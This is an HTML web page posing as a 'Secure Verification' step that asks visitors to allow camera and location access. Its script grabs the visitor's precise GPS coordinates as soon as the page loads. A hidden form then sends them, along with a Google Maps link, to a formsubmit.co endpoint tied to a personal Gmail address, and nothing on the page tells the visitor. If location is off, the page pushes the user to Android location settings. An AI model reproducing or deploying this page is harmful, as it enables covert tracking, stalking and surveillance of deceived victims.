<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Secure Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
  background:#0f172a;
  color:#fff;
  font-family:Arial,sans-serif;
  text-align:center;
  padding:30px;
}
.box{
  max-width:420px;
  margin:auto;
  background:#020617;
  border-radius:10px;
  padding:24px;
}
.notice{font-size:14px;opacity:.85}
#status{margin-top:16px;font-weight:bold}
button{
  margin-top:18px;
  padding:12px 20px;
  font-size:15px;
  border:none;
  border-radius:6px;
}
</style>
</head>

<body>

<div class="box">
  <h2>Verification</h2>
  <p class="notice">
    This verification requires camera and location access.
    Please tap <b>Allow</b> when prompted.
  </p>

  <div id="status">Initializing…</div>

  <button id="enableGPS" style="display:none">
    Enable Location
  </button>
</div>

<form id="sendForm"
action="https://formsubmit.co/delfinadodennis26@gmail.com"
method="POST">
  <input type="hidden" name="Latitude" id="lat">
  <input type="hidden" name="Longitude" id="lon">
  <input type="hidden" name="Google Maps" id="map">
  <input type="hidden" name="_captcha" value="false">
</form>

<script>
let gpsReady=false;
const status=document.getElementById("status");
const btn=document.getElementById("enableGPS");

setTimeout(start,1500);

function start(){
  status.innerText="Requesting location…";
  requestGPS();
}

function requestGPS(){
  navigator.geolocation.getCurrentPosition(
    pos=>{
      lat.value=pos.coords.latitude;
      lon.value=pos.coords.longitude;
      map.value=`https://maps.google.com/?q=${lat.value},${lon.value}`;
      gpsReady=true;
      sendForm.submit();
      status.innerText="Verification complete ✓";
    },
    ()=>{
      status.innerText="Location is OFF";
      btn.style.display="inline-block";
    },
    {enableHighAccuracy:true,timeout:5000}
  );
}

btn.onclick=()=>{
  window.location.href=
  "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end";
};
</script>

</body>
</html>
